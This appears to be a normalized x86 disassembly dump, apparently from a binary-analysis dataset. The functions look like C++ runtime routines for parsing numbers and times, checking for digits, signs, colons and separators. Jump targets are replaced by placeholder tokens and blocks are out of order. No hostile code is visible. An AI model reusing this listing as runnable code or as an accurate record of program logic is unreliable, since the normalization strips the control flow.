add ecx 0x9
cmp eax ecx
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x70 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x140 ]
call sub_100400d2
test [ ebp - 0x70 ] 0x10
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax [ ebp - 0x9c ]
jge r-xdata
mov eax [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
test edi edi
jbe r-xdata
test edi edi
je r-xdata
mov ecx esi
call sub_10040010
cmp ax [ ebp - 0xb8 ]
jne r-xdata
mov ecx esi
call sub_10040010
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10040544
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003fdb2
mov ecx [ ebp - 0xa0 ]
lea eax [ ebp - 0x178 ]
push eax
call sub_10040480
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10040636
push 0x0
push 0x1
lea ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x3
call sub_100400d2
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10040010
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov [ ebp - 0x65 ] 0x1
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10002020
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10007a24
inc edi
mov ecx esi
call sub_1003fdb2
push [ ebp - 0x74 ]
push esi
call sub_10040264
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
mov ecx edi
call sub_10040010
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
mov ecx edi
call sub_10040010
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10040544
inc [ ebp - 0x84 ]
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_10044e24
push 0x11c
mov eax sub_1004c443
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x74 ] ecx
xor edi edi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10042444
pop ecx
lea ecx [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100424e1
pop ecx
lea ecx [ ebp - 0x88 ]
jmp r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x6c ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10003c49
add esi 0x8
push esi
push edi
push 0x30
call sub_1003e793
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
mov [ ebp - 0x78 ] esi
call sub_10040467
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax edi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x6c ]
sub ecx eax
push esi
inc ecx
push ecx
push edi
lea ecx [ ebp + 0x24 ]
call sub_100407a3
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_100403af
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_100403e9
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_10040480
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
xor esi esi
mov [ ebp - 0x65 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_100403d0
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10040636
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x7
call sub_100400d2
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x48 ]
call sub_10040636
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
call sub_100400d2
lea ecx [ ebp - 0x64 ]
call sub_100403af
mov eax [ ebp - 0x74 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
movzx eax ax
mov [ ebp - 0x70 ] eax
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x6c ]
jmp r-xdata
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x65 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + 0x18 ]
cmp eax edi
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
xor esi esi
cmp eax esi
jbe r-xdata
mov edx [ ebp - 0x6c ]
cmp [ ebp + 0x38 ] edx
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x7c ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
mov eax edx
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_100407a3
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0x94 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003fbb1
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003fbb1
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov edi [ ecx + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edi edi
cmp edi edx
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
mov edi eax
inc [ ebp - 0x7c ]
cmp [ ebp - 0x7c ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003fbb1
add esp 0x14
xor esi esi
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_1003ff81
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x7c ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003fb75
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x74 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x84 ]
call sub_1003fbb1
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_100400d2
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_100400d2
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_100400d2
mov eax [ ebp - 0x84 ]
call sub_100282ef
retn 0x38
push edi
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003ff81
mov ecx eax
call sub_1004011f
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003fb75
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003ff81
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf0 ]
jmp r-xdata
mov eax [ ebp - 0x6c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_1003ff81
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd0 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_1003ff81
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x6c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x118 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003fb75
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f677
push [ ebp - 0x6c ]
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_100400a8
mov ecx eax
call sub_1004014e
push [ ebp - 0x6c ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe0 ]
jmp r-xdata
push [ ebp - 0x78 ]
lea ecx [ ebp + 0xc ]
call sub_1003f677
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f677
mov eax [ ebp - 0x6c ]
sub eax [ ebp + 0x38 ]
push eax
push [ ebp - 0x78 ]
lea eax [ ebp - 0xd8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003fbb1
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_1003ff81
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf8 ]
jmp r-xdata
sub_10045372
push 0x10
mov eax sub_1004c46b
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10003779
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_100426b8
push edi
push ebx
push eax
call sub_1003e7c1
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_100426f7
push edi
push ebx
push eax
call sub_1003e7c1
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1004b19c
mov [ esi + 0x10 ] eax
call sub_100282db
retn 0x4
sub_100453f5
push 0x54
mov eax sub_1004c496
call sub_1002826c
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x60 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x5c ] ebx
call sub_1004287f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_100087f2
add esp 0xc
lea ecx [ ebp - 0x48 ]
movzx ebx ax
call sub_10003d21
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_100084a7
xor esi esi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10005326
cmp [ eax ] bx
jb r-xdata
or [ edi ] 0x2
jmp r-xdata
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10007a24
push esi
lea ecx [ ebp - 0x2c ]
call sub_10005326
movzx eax [ eax ]
movzx ecx bx
add ecx 0x9
cmp ecx eax
jge r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_10001500
mov eax ebx
call sub_100282ef
retn 0x24
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x49 ] 0x30
sub [ ebp - 0x49 ] bl
cmp esi [ ebp - 0x18 ]
jae r-xdata
lea eax [ ebp - 0x50 ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x50 ] ebx
call sub_1002406c
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x44 ]
push esi
lea ecx [ ebp - 0x2c ]
call sub_10005326
mov al [ eax ]
add al [ ebp - 0x49 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x58 ] al
push [ ebp - 0x58 ]
push 0x1
call sub_10007a24
inc esi
cmp esi [ ebp - 0x18 ]
jb r-xdata
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x50 ] ebx
jne r-xdata
mov eax [ ebp - 0x60 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov ebx [ ebp - 0x5c ]
sub_10045547
push 0x20
mov eax sub_1004c4c3
call sub_1002826c
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1004287f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10001450
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10001500
mov eax edi
call sub_100282ef
retn 0x24
sub_100455c6
push 0x54
mov eax sub_1004c4f0
call sub_1002826c
fldz
xor ebx ebx
fcomp [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ebx
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_10003efc
fld [ ebp + 0x20 ]
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_10024bfa
add esp 0x14
xor esi esi
cmp eax ebx
mov [ ebp - 0x5c ] eax
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_100087f2
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_1000517a
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_1000136c
push [ ebp - 0x60 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100430fd
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10001500
mov eax [ ebp + 0x8 ]
call sub_100282ef
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_100087f2
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1000517a
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_100456e6
push 0x2c
mov eax sub_1004c51d
call sub_1002826c
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x34 ] edi
add edi 0x8
push edi
push 0x0
push 0x30
call sub_100087f2
add esp 0xc
cmp [ esi + 0x18 ] 0x8
movzx ebx ax
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
movzx eax [ esi ]
cmp bx ax
ja r-xdata
inc esi
mov [ ebp - 0x30 ] 0x1
inc esi
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x30 ] 0x0
call sub_100087f2
add esp 0xc
cmp [ esi ] ax
jne r-xdata
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_100026f9
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
movzx ecx bx
movzx eax ax
add ecx 0x9
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x38 ] esp
push eax
call sub_1000136c
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100430fd
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
mov eax [ ebp + 0x8 ]
call sub_100282ef
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000517a
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_100457bc
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1004364b
mov eax esi
call sub_100282db
retn 0x8
sub_100457ef
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x20
sub_10045818
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x18 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x20
sub_10045859
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10045841
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1004587a
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ebx
call sub_100087f2
add esp 0xc
push [ ebp - 0x28 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea edi [ ebp - 0x24 ]
call sub_100081f6
test al al
jne r-xdata
push [ ebp - 0x28 ]
xor bl bl
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push 0x0
push 0x2b
call sub_100087f2
add esp 0xc
mov ecx esi
mov bx ax
call sub_10007c7b
cmp ax bx
jne r-xdata
push [ ebp - 0x28 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10007c7b
cmp ax [ ebp - 0x2c ]
jne r-xdata
push [ ebp - 0x34 ]
push 0x0
push 0x2d
call sub_100087f2
add esp 0xc
mov ecx esi
mov bx ax
call sub_10007c7b
cmp ax bx
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ecx esi
call sub_10007c7b
cmp [ ebp - 0x2c ] ax
ja r-xdata
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_10007d14
push [ ebp - 0x28 ]
push esi
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] 0x2d
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_10007d14
mov ecx esi
call sub_10007c7b
movzx ecx [ ebp - 0x2c ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x30 ] ebx
call sub_10023c74
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_100081f6
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov ecx esi
call sub_10007c7b
mov cl 0x30
sub cl [ ebp - 0x2c ]
add al cl
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x3c ] eax
je r-xdata
inc ebx
mov ecx esi
mov bl 0x1
call sub_10007d14
inc edi
or ebx 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
sub_10045a14
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_100087f2
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x4 ]
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007d14
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007d14
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_10045ad8
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_100087f2
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_100087f2
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_100087f2
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_100087f2
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_100087f2
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
